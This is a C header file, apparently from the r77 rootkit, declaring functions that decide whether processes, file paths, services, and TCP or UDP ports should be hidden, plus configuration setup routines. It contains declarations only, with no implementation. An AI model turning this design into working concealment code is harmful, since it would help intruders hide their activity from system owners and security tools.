#include "r77mindef.h"
#include "r77config.h"
#ifndef _CONFIG_H
#define _CONFIG_H

/// <summary>
/// Initializes the configuration system.
/// </summary>
VOID InitializeConfig();
/// <summary>
/// Uninitializes the configuration system.
/// </summary>
VOID UninitializeConfig();
static DWORD WINAPI UpdateConfigThread(LPVOID parameter);

/// <summary>
/// Determines whether a process should be hidden based on a specific process ID.
/// </summary>
/// <param name="processId">The process ID to check.</param>
/// <returns>
/// TRUE, if the process with the specified ID should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsProcessIdHidden(DWORD processId);
/// <summary>
/// Determines whether a process should be hidden based on a specific name.
/// </summary>
/// <param name="name">The process name to check.</param>
/// <returns>
/// TRUE, if the process with the specified name should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsProcessNameHidden(LPCWSTR name);
/// <summary>
/// Determines whether a process should be hidden based on a specific name.
/// </summary>
/// <param name="name">The process name to check.</param>
/// <returns>
/// TRUE, if the process with the specified name should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsProcessNameHiddenU(UNICODE_STRING name);
/// <summary>
/// Determines whether a file or directory should be hidden based on its full path.
/// </summary>
/// <param name="path">The full path to check.</param>
/// <returns>
/// TRUE, if the file or directory with the specified full path should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsPathHidden(LPCWSTR path);
/// <summary>
/// Determines whether a service should be hidden based on a specific name.
/// </summary>
/// <param name="name">The service name to check.</param>
/// <returns>
/// TRUE, if the service with the specified name should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsServiceNameHidden(LPCWSTR name);
/// <summary>
/// Determines whether a local TCP port should be hidden.
/// </summary>
/// <param name="port">The TCP port to check.</param>
/// <returns>
/// TRUE, if the local TCP port should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsTcpLocalPortHidden(USHORT port);
/// <summary>
/// Determines whether a remote TCP port should be hidden.
/// </summary>
/// <param name="port">The TCP port to check.</param>
/// <returns>
/// TRUE, if the remote TCP port should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsTcpRemotePortHidden(USHORT port);
/// <summary>
/// Determines whether a UDP port should be hidden.
/// </summary>
/// <param name="port">The UDP port to check.</param>
/// <returns>
/// TRUE, if the UDP port should be hidden;
/// otherwise, FALSE.
/// </returns>
BOOL IsUdpPortHidden(USHORT port);

#endif